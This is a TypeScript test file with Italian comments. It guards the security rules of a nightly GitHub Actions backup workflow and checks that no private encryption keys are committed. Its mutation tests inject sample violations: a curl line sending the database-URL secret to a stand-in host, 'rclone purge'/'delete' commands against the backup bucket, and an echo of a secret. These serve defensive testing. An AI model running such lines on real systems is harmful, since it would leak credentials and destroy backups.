import { describe, it, expect } from 'vitest'
import { execFileSync } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'

/**
 * LOCK — il backup notturno non può tradire chi lo ha voluto.
 *
 * ─── PERCHÉ ESISTE ──────────────────────────────────────────────────────────
 * Roadmap di robustezza, fase 2 (D1 e D2). `.github/workflows/backup-notturno.yml` gira di notte,
 * senza persone, con in mano le chiavi che leggono TUTTI i dati dei bambini (il database, i
 * 14 GB di file) e quelle che scrivono sulla cassaforte esterna. Un backup che fallisce in
 * silenzio è peggio di nessun backup, perché si crede di averlo. Un backup scritto in modo sbagliato
 * può anche far uscire i dati invece di metterli al sicuro. In un repository PUBBLICO gli errori
 * di questo tipo sono leggibili da chiunque. Quindi il file è sorvegliato riga per riga.
 *
 * ─── COSA PRETENDE QUESTO LOCK ──────────────────────────────────────────────
 *  TRIGGER   solo `workflow_dispatch` e, quando verrà armato, un unico `schedule` non alle :00.
 *            Mai `pull_request`, `push`, `workflow_run`: i segreti non si espongono a un evento
 *            che chiunque con un branch può provocare.
 *  PERMESSI  `contents: read` e basta; solo il job `avviso` può avere in più `issues: write`.
 *  SEGRETI   solo quelli dell'elenco, tutti documentati in `docs/cicd.md`, usati SOLO in
 *            `NOME: ${{ secrets.X }}` (mai dentro un comando); i `BACKUP_*` solo nel job
 *            `backup`, che sta nell'ambiente GitHub `backup` (ristretto a `main`).
 *  AZIONI    solo `actions/checkout@v4`, con `persist-credentials: false`. Niente artefatti: in
 *            un repository pubblico sono scaricabili da chiunque.
 *  RCLONE    versione esatta con impronta verificata; sottocomandi ammessi solo `copyto`,
 *            `lsjson`, `lsf`, `cat`, `size`, `obscure`, `version`; ogni `copyto` con `--immutable`.
 *            Il `sync` vive solo nello script dello specchio, che manda tutto in un cestino.
 *  DUMP      mai `pg_dump` chiamato dal workflow (solo `--version`): passa dallo script, che cifra
 *            prima di scrivere. Nessun `set -x`, nessun comando che stampi un segreto.
 *  CHIAVE    la chiave `age` nel file è PUBBLICA, ha la forma giusta e non è il segnaposto. In
 *            nessun file tracciato del repo c'è una chiave age PRIVATA.
 *  ALLARME   il job `avviso` dipende dal backup e dal guasto simulato, parte con `failure()`,
 *            apre prima la segnalazione (nessun segreto) e poi manda l'email.
 *
 * ─── COME LEGGE IL FILE ─────────────────────────────────────────────────────
 * Si tolgono i commenti PRIMA di cercare: l'intestazione del workflow spiega proprio le cose che
 * vieta, e un lock che legge anche la prosa si immunizza da solo. Le PROVE GEMELLE in fondo
 * rompono ogni regola a turno e pretendono che il lock diventi rosso.
 */

const RADICE = process.cwd()
const FILE = join(RADICE, '.github', 'workflows', 'backup-notturno.yml')
const CICD = join(RADICE, 'docs', 'cicd.md')

const SEGNAPOSTO = 'age1segnapostoinserirelachiavepubblicadeltitolarexxxxxxxxxxxxx'
const CHIAVE_DI_PROVA = 'age1' + 'q'.repeat(58)

const SEGRETI_BACKUP = [
    'BACKUP_R2_ACCOUNT_ID',
    'BACKUP_R2_KEY_ID',
    'BACKUP_R2_KEY_SECRET',
    'BACKUP_SUPABASE_S3_KEY_ID',
    'BACKUP_SUPABASE_S3_KEY_SECRET',
    'BACKUP_CRYPT_PASSWORD',
    'BACKUP_CRYPT_SALT',
    'BACKUP_DB_URL',
]
const SEGRETI_AMMESSI = [...SEGRETI_BACKUP, 'RESEND_API_KEY', 'SENTINELLA_DESTINATARI']
/**
 * LA SCELTA DEL TITOLARE (2026-10-06): foto e video della galleria NON vanno nel backup, per non
 * pagare spazio per cose che non si vogliono salvare. L'elenco degli esclusi deve essere ESATTAMENTE
 * questo. Cambiarlo è una decisione sua: si cambia qui, con la ragione scritta accanto.
 */
const BUCKET_ESCLUSI_DECISI = ['gallery', 'video_originals']
/** I bucket insostituibili: non possono MAI stare fra gli esclusi, qualunque cosa si decida. */
const BUCKET_INSOSTITUIBILI = [
    'protocollo', 'sensitive_documents', 'documenti_personale', 'fatture', 'pagelle', 'credenziali',
    'registro-allegati', 'form_attachments', 'video_build', 'iscrizioni_elenchi', 'avvisi_allegati',
    'certificati-medici', 'cassa-giustificativi', 'task_allegati',
]
const SOTTOCOMANDI_RCLONE = ['copyto', 'lsjson', 'lsf', 'cat', 'size', 'obscure', 'version']
const EVENTI_VIETATI = [
    'push', 'pull_request', 'pull_request_target', 'workflow_run', 'repository_dispatch',
    'issues', 'issue_comment', 'release', 'create', 'fork', 'watch', 'status',
]

/** Toglie i commenti YAML e shell: `#` a inizio riga o dopo uno spazio, fino a fine riga. */
function senzaCommenti(yaml: string): string {
    return yaml
        .split('\n')
        .map((riga) => riga.replace(/(^|\s)#.*$/, '$1'))
        .join('\n')
}

/** I nomi degli eventi sotto `on:`. */
function trigger(codice: string): string[] {
    const righe = codice.split('\n')
    const i = righe.findIndex((r) => /^on\s*:/.test(r))
    if (i < 0) return []
    const eventi: string[] = []
    for (const r of righe.slice(i + 1)) {
        if (/^\S/.test(r)) break
        const m = /^ {2}([A-Za-z_]+)\s*:/.exec(r)
        if (m) eventi.push(m[1])
    }
    return eventi
}

/** Il blocco di un job (dalla sua intestazione alla prossima, a indentazione 2). */
function blocco(codice: string, job: string): string | null {
    const righe = codice.split('\n')
    const j = righe.findIndex((r) => /^jobs\s*:/.test(r))
    if (j < 0) return null
    const i = righe.findIndex((r, k) => k > j && new RegExp(`^ {2}${job}\\s*:\\s*$`).test(r))
    if (i < 0) return null
    const out: string[] = [righe[i]]
    for (const r of righe.slice(i + 1)) {
        if (/^ {2}[A-Za-z_][\w-]*\s*:\s*$/.test(r) || /^\S/.test(r)) break
        out.push(r)
    }
    return out.join('\n')
}

function nomiDeiJob(codice: string): string[] {
    const righe = codice.split('\n')
    const j = righe.findIndex((r) => /^jobs\s*:/.test(r))
    if (j < 0) return []
    const nomi: string[] = []
    for (const r of righe.slice(j + 1)) {
        if (/^\S/.test(r)) break
        const m = /^ {2}([A-Za-z_][\w-]*)\s*:\s*$/.exec(r)
        if (m) nomi.push(m[1])
    }
    return nomi
}

/** Le chiavi `k: v` di un blocco `nome:` a livello radice (es. `permissions`, `env`). */
function bloccoRadice(codice: string, nome: string): Record<string, string> {
    const righe = codice.split('\n')
    const i = righe.findIndex((r) => new RegExp(`^${nome}\\s*:\\s*$`).test(r))
    const out: Record<string, string> = {}
    if (i < 0) return out
    for (const r of righe.slice(i + 1)) {
        if (/^\S/.test(r)) break
        const m = /^ {2}([A-Za-z_][\w-]*)\s*:\s*(.*)$/.exec(r)
        if (m) out[m[1]] = m[2].trim().replace(/^["']|["']$/g, '')
    }
    return out
}

/** Le violazioni del workflow; vuoto = a posto. `cicd` è il testo di docs/cicd.md. */
function violazioni(grezzo: string, cicd: string): string[] {
    const c = senzaCommenti(grezzo)
    const v: string[] = []
    const righe = c.split('\n')

    // ── TRIGGER ─────────────────────────────────────────────────────────────
    const eventi = trigger(c)
    if (!eventi.includes('workflow_dispatch')) v.push('trigger: manca workflow_dispatch')
    for (const e of eventi) {
        if (EVENTI_VIETATI.includes(e)) v.push(`trigger vietato: ${e}`)
        else if (e !== 'workflow_dispatch' && e !== 'schedule') v.push(`trigger non ammesso: ${e}`)
    }
    if (eventi.includes('schedule')) {
        const cron = [...c.matchAll(/-\s*cron:\s*['"]([^'"]+)['"]/g)].map((m) => m[1])
        if (cron.length !== 1) v.push(`schedule: ci vuole UN solo cron, ce ne sono ${cron.length}`)
        for (const x of cron) {
            const m = /^(\d{1,2}) (\d{1,2}) \* \* \*$/.exec(x)
            if (!m) v.push(`schedule: forma del cron non ammessa «${x}»`)
            else if (m[1] === '0') v.push('schedule: non alle :00 (a quell\'ora GitHub è intasato)')
        }
    }

    // ── PERMESSI ────────────────────────────────────────────────────────────
    const permessi = bloccoRadice(c, 'permissions')
    if (Object.keys(permessi).length !== 1 || permessi.contents !== 'read') {
        v.push('permessi: in cima ci vuole esattamente `contents: read`')
    }
    if (/^permissions:[ \t]*\S/m.test(c)) v.push('permessi: forma in linea non ammessa (write-all?)')

    // ── JOB ────────────────────────────────────────────────────────────────
    const job = nomiDeiJob(c)
    for (const atteso of ['backup', 'guasto_simulato', 'avviso']) {
        if (!job.includes(atteso)) v.push(`manca il job ${atteso}`)
    }
    for (const nome of job) {
        const b = blocco(c, nome) ?? ''
        if (!/^\s{4}timeout-minutes:\s*\d+/m.test(b)) v.push(`job ${nome}: manca timeout-minutes`)
        if (!/^\s{4}runs-on:\s*ubuntu-24\.04\s*$/m.test(b)) v.push(`job ${nome}: runs-on deve essere ubuntu-24.04 (fissato, non latest)`)
        const perm = /^\s{4}permissions:\s*\n((?:\s{6}\S.*\n?)+)/m.exec(b)
        if (nome === 'avviso') {
            const dichiarati = perm ? perm[1].trim().split('\n').map((x) => x.trim()).sort() : []
            if (dichiarati.join('|') !== 'contents: read|issues: write') {
                v.push('permessi: avviso deve avere esattamente `contents: read` e `issues: write`')
            }
        } else if (perm) {
            v.push(`permessi: il job ${nome} non deve dichiarare permessi propri`)
        }
    }

    const backup = blocco(c, 'backup') ?? ''
    if (!/^\s{4}environment:\s*backup\s*$/m.test(backup)) {
        v.push('il job backup deve stare nell\'ambiente `environment: backup` (ristretto a main)')
    }
    const avviso = blocco(c, 'avviso') ?? ''
    if (!/^\s{4}needs:\s*\[\s*backup\s*,\s*guasto_simulato\s*\]\s*$/m.test(avviso)) {
        v.push('avviso: needs deve essere [backup, guasto_simulato]')
    }
    if (!/^\s{4}if:\s*\$\{\{\s*failure\(\)\s*\}\}\s*$/m.test(avviso)) v.push('avviso: deve partire con `if: ${{ failure() }}`')
    if (/^\s{4}environment:/m.test(avviso)) v.push('avviso: non deve stare in un ambiente (non ha bisogno dei segreti di backup)')
    const ordine = [avviso.indexOf('Apri o aggiorna la segnalazione'), avviso.indexOf("Manda l'email")]
    if (ordine[0] < 0 || ordine[1] < 0 || ordine[0] > ordine[1]) {
        v.push('avviso: la segnalazione (senza segreti) deve venire PRIMA dell\'email')
    }
    const guasto = blocco(c, 'guasto_simulato') ?? ''
    if (!/exit 1/.test(guasto)) v.push('guasto_simulato: deve fallire davvero (`exit 1`)')

    // ── CONCORRENZA ────────────────────────────────────────────────────────
    if (!/^concurrency:\s*\n\s+group:\s*backup-notturno\s*\n\s+cancel-in-progress:\s*false\s*$/m.test(c)) {
        v.push('concurrency: gruppo `backup-notturno` con `cancel-in-progress: false`')
    }

    // ── AZIONI ─────────────────────────────────────────────────────────────
    const usi = [...c.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1])
    for (const u of usi) if (u !== 'actions/checkout@v4') v.push(`azione non ammessa: ${u}`)
    if (/upload-artifact|actions\/cache/.test(c)) v.push('azione non ammessa: upload-artifact/cache (in un repo pubblico gli artefatti si scaricano da fuori)')
    if (!/persist-credentials:\s*false/.test(c)) v.push('checkout: manca persist-credentials: false')

    // ── SEGRETI ────────────────────────────────────────────────────────────
    const usati = new Set([...c.matchAll(/secrets\.([A-Za-z0-9_]+)/g)].map((m) => m[1]))
    for (const s of usati) {
        if (!SEGRETI_AMMESSI.includes(s)) v.push(`segreto non ammesso: ${s}`)
        else if (s.startsWith('BACKUP_') && !cicd.includes(s)) v.push(`segreto ${s} non documentato in docs/cicd.md`)
    }
    for (const riga of righe) {
        if (/secrets\./.test(riga) && !/^\s*[A-Z_][A-Z0-9_]*:\s.*\$\{\{\s*secrets\.[A-Z0-9_]+\s*\}\}/.test(riga)) {
            v.push(`segreto usato fuori da un'assegnazione NOME: \${{ secrets.X }}: «${riga.trim().slice(0, 60)}»`)
        }
        if (/inputs\./.test(riga) && !/^\s*(MODALITA|SIMULATO|if)\s*:/.test(riga)) {
            v.push(`input usato fuori da env/if (rischio di iniezione nello script): «${riga.trim().slice(0, 60)}»`)
        }
    }
    for (const nome of ['avviso', 'guasto_simulato']) {
        if (/secrets\.BACKUP_/.test(blocco(c, nome) ?? '')) v.push(`segreti BACKUP_ vietati nel job ${nome}`)
    }

    // ── RCLONE ─────────────────────────────────────────────────────────────
    if (!/RCLONE_VERSION:\s*"\d+\.\d+\.\d+"/.test(c)) v.push('rclone: versione esatta mancante')
    if (!/RCLONE_SHA256:\s*"[0-9a-f]{64}"/.test(c)) v.push('rclone: impronta sha256 mancante')
    if (!/sha256sum -c/.test(c)) v.push('rclone: l\'impronta sha256 non viene verificata (manca `sha256sum -c`)')
    if (/rclone-current|rclone\/latest|\blatest\b/i.test(c)) v.push('versione `latest`/current vietata')
    for (const m of c.matchAll(/\brclone[ \t]+([a-z]+)/g)) {
        if (!SOTTOCOMANDI_RCLONE.includes(m[1])) v.push(`sottocomando di rclone non ammesso: ${m[1]}`)
    }
    for (const riga of righe) {
        if (/\brclone[ \t]+copyto\b/.test(riga) && !/--immutable/.test(riga)) v.push('rclone copyto senza --immutable')
    }
    if (!/postgresql-client-17/.test(c)) v.push('serve il client postgresql-client-17 (stesso major del server)')

    // ── DUMP E SEGRETI NEI LOG ─────────────────────────────────────────────
    for (const riga of righe) {
        if (/pg_dump/.test(riga) && !/--version/.test(riga)) v.push(`pg_dump chiamato dal workflow: deve passare dallo script (cifra prima di scrivere): «${riga.trim().slice(0, 60)}»`)
    }
    if (!/bash scripts\/backup\/dump-cifrato\.sh/.test(c)) v.push('il dump deve passare da scripts/backup/dump-cifrato.sh')
    if (!/bash scripts\/backup\/specchio-storage\.sh/.test(c)) v.push('lo specchio deve passare da scripts/backup/specchio-storage.sh')
    if (/\bset\s+-[a-z]*x/.test(c) || /ACTIONS_(STEP|RUNNER)_DEBUG/.test(c)) v.push('set -x / debug dei passi vietati (stamperebbero valori derivati dai segreti)')
    for (const riga of righe) {
        const stampa = /\b(echo|printf)\b/.test(riga)
        const toccaSegreto = /\$\{?(BACKUP_[A-Z_]+|CRYPT_PW|CRYPT_SALT|P1|P2|RESEND_API_KEY|RCLONE_CONFIG_[A-Z_]*(KEY|SECRET|PASSWORD)[A-Z_]*)\b/.test(riga)
        if (stampa && toccaSegreto && !/>>\s*"\$GITHUB_ENV"/.test(riga) && !/::add-mask::/.test(riga)) {
            v.push(`stampa un segreto: «${riga.trim().slice(0, 60)}»`)
        }
    }

    // ── MODALITÀ PROVA ─────────────────────────────────────────────────────
    if (!/modalita:[\s\S]*?default:\s*prova/.test(c)) v.push('input modalita: il default deve essere `prova`')
    if (!/PREFISSO_DB=prove\/run-/.test(c) || !/CRIPTO_REMOTE=R2:\$\{R2_BUCKET\}\/prove\/run-/.test(c)) {
        v.push('la modalità prova deve scrivere SOLO sotto prove/')
    }

    // ── BUCKET ESCLUSI DAL BACKUP ──────────────────────────────────────────
    const esclusi = (bloccoRadice(c, 'env').ESCLUDI_BUCKET ?? '').split(/\s+/).filter(Boolean).sort()
    if (esclusi.join(' ') !== [...BUCKET_ESCLUSI_DECISI].sort().join(' ')) {
        v.push(`bucket esclusi: devono essere esattamente «${BUCKET_ESCLUSI_DECISI.join(' ')}» (scelta del titolare, 2026-10-06), non «${esclusi.join(' ')}»`)
    }
    for (const e of esclusi) {
        if (BUCKET_INSOSTITUIBILI.includes(e)) v.push(`bucket insostituibile escluso dal backup: ${e}`)
    }

    // ── CHIAVE age ─────────────────────────────────────────────────────────
    const chiave = (bloccoRadice(c, 'env').AGE_PUBLIC_KEY ?? '').trim()
    if (/AGE-SECRET-KEY-/.test(c)) v.push('chiave age PRIVATA nel workflow')
    if (!/^age1[a-z0-9]{58}$/.test(chiave)) v.push('la chiave pubblica age non ha la forma attesa (age1 + 58 caratteri)')
    return v
}

function repoTracciato(): string[] {
    return execFileSync('git', ['ls-files'], { cwd: RADICE, encoding: 'utf8' }).split('\n').filter(Boolean)
}

const REALE = readFileSync(FILE, 'utf8')
const DOC = readFileSync(CICD, 'utf8')
/** La chiave pubblica che il workflow usa davvero (le prove gemelle la sostituiscono). */
const CHIAVE_REALE = /^\s{2}AGE_PUBLIC_KEY:\s*(\S+)\s*$/m.exec(REALE)?.[1] ?? CHIAVE_DI_PROVA
/** Base delle prove gemelle: il workflow vero, con la chiave vera. */
const BASE = REALE

describe('LOCK · backup-notturno.yml', () => {
    it('il file esiste e gli script che chiama esistono', () => {
        expect(existsSync(FILE)).toBe(true)
        for (const s of ['dump-cifrato.sh', 'specchio-storage.sh']) {
            expect(existsSync(join(RADICE, 'scripts', 'backup', s)), s).toBe(true)
        }
    })

    it('rispetta tutte le regole', () => {
        expect(violazioni(BASE, DOC)).toEqual([])
    })

    it('🔑 la chiave pubblica age nel file è quella del titolare, non il segnaposto', () => {
        // Questo test resta ROSSO finché il titolare non consegna la sua chiave pubblica: è voluto,
        // è il cancello che impedisce di mergiare un workflow che cifrerebbe per nessuno.
        const chiave = /^\s{2}AGE_PUBLIC_KEY:\s*(\S+)\s*$/m.exec(REALE)?.[1]
        expect(chiave, 'AGE_PUBLIC_KEY non trovata nel workflow').toBeDefined()
        expect(chiave, 'AGE_PUBLIC_KEY è ancora il SEGNAPOSTO: serve la chiave pubblica del titolare').not.toBe(SEGNAPOSTO)
    })

    it('in nessun file tracciato c\'è una chiave age PRIVATA', () => {
        const trovati: string[] = []
        for (const f of repoTracciato()) {
            if (/\.(png|jpe?g|gif|webp|ico|pdf|mp4|mov|woff2?|ttf|zip|gz|jar|aar|apk|aab|keystore|jks)$/i.test(f)) continue
            const p = join(RADICE, f)
            if (!existsSync(p)) continue
            let testo = ''
            try { testo = readFileSync(p, 'utf8') } catch { continue }
            if (/AGE-SECRET-KEY-1[A-Z0-9]{50,}/.test(testo)) trovati.push(f)
        }
        expect(trovati).toEqual([])
    })

    it('docs/cicd.md documenta l\'ambiente `backup` e tutti i segreti BACKUP_*', () => {
        expect(DOC).toMatch(/ambiente[^\n]*`backup`|environment[^\n]*`backup`/i)
        for (const s of SEGRETI_BACKUP) expect(DOC, s).toContain(s)
    })
})

describe('PROVE GEMELLE · il lock diventa rosso quando una regola si rompe', () => {
    const MUTAZIONI: Array<[string, (s: string) => string, RegExp]> = [
        ['trigger pull_request', (s) => s.replace('on:\n  workflow_dispatch:', 'on:\n  pull_request:\n  workflow_dispatch:'), /trigger vietato: pull_request/],
        ['trigger push', (s) => s.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n  workflow_dispatch:'), /trigger vietato: push/],
        ['trigger workflow_run', (s) => s.replace('on:\n  workflow_dispatch:', 'on:\n  workflow_run:\n  workflow_dispatch:'), /trigger vietato: workflow_run/],
        ['cron alle :00', (s) => s.replace('on:\n  workflow_dispatch:', "on:\n  schedule:\n    - cron: '0 2 * * *'\n  workflow_dispatch:"), /non alle :00/],
        ['due cron', (s) => s.replace('on:\n  workflow_dispatch:', "on:\n  schedule:\n    - cron: '23 2 * * *'\n    - cron: '41 3 * * *'\n  workflow_dispatch:"), /UN solo cron/],
        ['senza ambiente backup', (s) => s.replace('    environment: backup\n', ''), /environment: backup/],
        ['permessi write-all', (s) => s.replace('permissions:\n  contents: read\n\nconcurrency', 'permissions: write-all\n\nconcurrency'), /permessi/],
        ['permessi contents: write', (s) => s.replace('permissions:\n  contents: read\n\nconcurrency', 'permissions:\n  contents: write\n\nconcurrency'), /permessi/],
        ['upload-artifact', (s) => s.replace('      - name: Riepilogo', '      - uses: actions/upload-artifact@v4\n      - name: Riepilogo'), /azione non ammessa/],
        ['azione di terzi', (s) => s.replace('      - name: Riepilogo', '      - uses: someone/random-action@main\n      - name: Riepilogo'), /azione non ammessa: someone/],
        ['runner latest', (s) => s.replaceAll('ubuntu-24.04', 'ubuntu-latest'), /runs-on deve essere ubuntu-24.04/],
        ['copyto senza --immutable', (s) => s.replace('--immutable --s3-upload-cutoff', '--s3-upload-cutoff'), /copyto senza --immutable/],
        ['rclone purge', (s) => s.replace('      - name: Riepilogo', '      - run: rclone purge R2:kidville-backup/db\n      - name: Riepilogo'), /sottocomando di rclone non ammesso: purge/],
        ['rclone sync diretto', (s) => s.replace('      - name: Riepilogo', '      - run: rclone sync SB: CRIPTO:corrente\n      - name: Riepilogo'), /sottocomando di rclone non ammesso: sync/],
        ['rclone delete', (s) => s.replace('      - name: Riepilogo', '      - run: rclone delete R2:kidville-backup\n      - name: Riepilogo'), /sottocomando di rclone non ammesso: delete/],
        ['segreto estraneo', (s) => s.replace('      MODALITA:', '      ALTRO: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n      MODALITA:'), /segreto non ammesso: AWS_SECRET_ACCESS_KEY/],
        ['segreto dentro un comando', (s) => s.replace('echo "::notice::dump caricato', 'curl https://x.example/${{ secrets.BACKUP_DB_URL }}\n          echo "::notice::dump caricato'), /fuori da un'assegnazione/],
        ['segreto BACKUP_ nel job avviso', (s) => s.replace('          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n          SIMULATO: ${{ inputs.simula_guasto }}\n        run: |\n          set -o pipefail', '          ALTRO: ${{ secrets.BACKUP_DB_URL }}\n          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n          SIMULATO: ${{ inputs.simula_guasto }}\n        run: |\n          set -o pipefail'), /segreti BACKUP_ vietati nel job avviso/],
        ['input dentro uno script', (s) => s.replace('echo "::notice::dump caricato', 'echo ${{ inputs.modalita }}\n          echo "::notice::dump caricato'), /input usato fuori da env\/if/],
        ['senza persist-credentials', (s) => s.replace('          persist-credentials: false\n', ''), /persist-credentials/],
        ['chiave age privata', (s) => s.replace(CHIAVE_REALE, 'AGE-SECRET-KEY-1' + 'Q'.repeat(50)), /chiave age PRIVATA/],
        ['chiave age fuori forma', (s) => s.replace(CHIAVE_REALE, 'age1corta'), /forma attesa/],
        ['senza verifica sha256', (s) => s.replace('echo "${RCLONE_SHA256}  $RUNNER_TEMP/rclone.zip" | sha256sum -c -', 'true'), /sha256sum -c/],
        ['rclone latest', (s) => s.replace('RCLONE_VERSION: "1.75.1"', 'RCLONE_VERSION: "latest"'), /versione esatta mancante|latest/],
        ['set -x', (s) => s.replace('          set -euo pipefail\n          sudo apt-get update', '          set -euxo pipefail\n          sudo apt-get update'), /set -x/],
        ['stampa un segreto', (s) => s.replace('echo "::notice::dump caricato', 'echo "$BACKUP_DB_URL"\n          echo "::notice::dump caricato'), /stampa un segreto/],
        ['pg_dump dal workflow', (s) => s.replace('      - name: Riepilogo', '      - run: pg_dump -f /tmp/dump.sql "$X"\n      - name: Riepilogo'), /pg_dump chiamato dal workflow/],
        ['cancel-in-progress true', (s) => s.replace('cancel-in-progress: false', 'cancel-in-progress: true'), /concurrency/],
        ['senza timeout', (s) => s.replace('    timeout-minutes: 180\n', ''), /manca timeout-minutes/],
        ['avviso senza needs', (s) => s.replace('    needs: [backup, guasto_simulato]\n', ''), /needs/],
        ['avviso senza failure()', (s) => s.replace('    if: ${{ failure() }}', '    if: ${{ always() }}'), /failure\(\)/],
        ['avviso in un ambiente', (s) => s.replace('    if: ${{ failure() }}\n', '    if: ${{ failure() }}\n    environment: backup\n'), /non deve stare in un ambiente/],
        ['email prima della segnalazione', (s) => s.replace('Apri o aggiorna la segnalazione nel repository', 'Zzz').replace("Manda l'email", 'Apri o aggiorna la segnalazione nel repository').replace('name: Zzz', "name: Manda l'email"), /PRIMA dell'email/],
        ['guasto simulato che non fallisce', (s) => s.replace('          exit 1\n\n  avviso:', '          exit 0\n\n  avviso:'), /deve fallire davvero/],
        ['default della modalità = completo', (s) => s.replace('        default: prova', '        default: completo'), /il default deve essere `prova`/],
        ['la prova scrive fuori da prove/', (s) => s.replace('PREFISSO_DB=prove/run-', 'PREFISSO_DB=db/run-'), /SOLO sotto prove/],
        ['senza client Postgres 17', (s) => s.replace('postgresql-client-17', 'postgresql-client'), /postgresql-client-17/],
        ['senza passare dallo script del dump', (s) => s.replace('bash scripts/backup/dump-cifrato.sh', 'true'), /dump-cifrato\.sh/],
        ['esclude anche il protocollo', (s) => s.replace('ESCLUDI_BUCKET: gallery video_originals', 'ESCLUDI_BUCKET: gallery video_originals protocollo'), /bucket insostituibile escluso dal backup: protocollo/],
        ['esclude anche le iscrizioni (form_attachments)', (s) => s.replace('ESCLUDI_BUCKET: gallery video_originals', 'ESCLUDI_BUCKET: gallery video_originals form_attachments'), /insostituibile escluso dal backup: form_attachments/],
        ['esclude i programmi FFmpeg (video_build)', (s) => s.replace('ESCLUDI_BUCKET: gallery video_originals', 'ESCLUDI_BUCKET: gallery video_build'), /insostituibile escluso dal backup: video_build/],
        ['esclude anche la chat (il titolare ha deciso di tenerla)', (s) => s.replace('ESCLUDI_BUCKET: gallery video_originals', 'ESCLUDI_BUCKET: gallery video_originals chat-allegati'), /devono essere esattamente/],
        ['esclude solo la galleria', (s) => s.replace('ESCLUDI_BUCKET: gallery video_originals', 'ESCLUDI_BUCKET: gallery'), /devono essere esattamente/],
        ['non esclude più niente', (s) => s.replace('  ESCLUDI_BUCKET: gallery video_originals\n', ''), /devono essere esattamente/],
        ['senza passare dallo script dello specchio', (s) => s.replaceAll('bash scripts/backup/specchio-storage.sh', 'true'), /specchio-storage\.sh/],
    ]

    it('controllo positivo: la base passa', () => {
        expect(violazioni(BASE, DOC)).toEqual([])
    })

    for (const [nome, rompi, atteso] of MUTAZIONI) {
        it(`mutazione «${nome}» → rosso`, () => {
            const mutato = rompi(BASE)
            expect(mutato, 'la mutazione non ha cambiato niente').not.toBe(BASE)
            expect(violazioni(mutato, DOC).join(' | ')).toMatch(atteso)
        })
    }

    it('mutazione «segreto non documentato in docs/cicd.md» → rosso', () => {
        const docSenza = DOC.replaceAll('BACKUP_CRYPT_SALT', 'XXXX')
        expect(violazioni(BASE, docSenza).join(' | ')).toMatch(/BACKUP_CRYPT_SALT non documentato/)
    })

    it('i commenti non contano: un commento che nomina `pull_request:` e `rclone purge` non fa scattare niente', () => {
        const conCommento = BASE.replace('on:\n', '# non usare pull_request: né rclone purge né upload-artifact\non:\n')
        expect(violazioni(conCommento, DOC)).toEqual([])
    })
})

describe('LOCK · le chiavi del backup non vanno online', () => {
    /**
     * Il titolare tiene la cartella delle chiavi (`KIDVILLE-CHIAVI-BACKUP/`: chiave privata age e
     * password di cifratura dei file) dentro la cartella dell'app, per averla a portata di mano.
     * Il repository è PUBBLICO: una riga di `.gitignore` è l'unica cosa che separa quella cartella
     * da internet, e basta una riga cancellata per sbaglio. Qui la riga è sorvegliata, e git stesso
     * conferma che i file dentro sono ignorati (anche quando la cartella non esiste, come in CI).
     */
    const CARTELLA = 'KIDVILLE-CHIAVI-BACKUP'
    const FILE_SENSIBILI = ['chiave-age-PRIVATA.txt', 'password-cifratura-file.txt']

    /** La regola esiste fuori dai commenti e chiude la cartella dalla radice. */
    function cartellaChiusa(gitignore: string): boolean {
        const senza = gitignore.split('\n').filter((r) => !r.trim().startsWith('#')).join('\n')
        return new RegExp(`^/${CARTELLA}/\\s*$`, 'm').test(senza)
    }

    const GITIGNORE = readFileSync(join(RADICE, '.gitignore'), 'utf8')

    it('.gitignore chiude la cartella delle chiavi', () => {
        expect(cartellaChiusa(GITIGNORE)).toBe(true)
    })

    it('git conferma: i file sensibili dentro la cartella sono ignorati', () => {
        for (const f of FILE_SENSIBILI) {
            let ignorato = true
            try {
                execFileSync('git', ['check-ignore', '-q', `${CARTELLA}/${f}`], { cwd: RADICE })
            } catch {
                ignorato = false
            }
            expect(ignorato, `${CARTELLA}/${f} NON è ignorato da git`).toBe(true)
        }
    })

    it('nessun file tracciato sta dentro la cartella delle chiavi', () => {
        expect(repoTracciato().filter((f) => f.startsWith(`${CARTELLA}/`))).toEqual([])
    })

    it('prova gemella: senza la riga, il controllo diventa rosso', () => {
        expect(cartellaChiusa(GITIGNORE.replace(`/${CARTELLA}/`, ''))).toBe(false)
    })

    it('prova gemella: la riga scritta solo in un commento non vale', () => {
        const solo = GITIGNORE.replace(`\n/${CARTELLA}/`, `\n# /${CARTELLA}/`)
        expect(solo).not.toBe(GITIGNORE)
        expect(cartellaChiusa(solo)).toBe(false)
    })
})
